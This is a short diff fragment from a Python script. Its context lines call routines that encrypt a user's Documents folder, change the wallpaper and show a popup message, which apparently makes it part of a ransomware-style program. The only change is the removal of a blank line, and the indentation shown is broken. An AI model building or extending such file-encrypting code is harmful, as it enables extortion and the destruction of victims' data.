@@ -90,7 +90,6 @@ while True:
     encrypt_folder("C:\\Users\\<username>\\Documents\\", key)
     change_wallpaper(message)
     show_popup(message)
-
     elif method_choice == "8":
     break
 
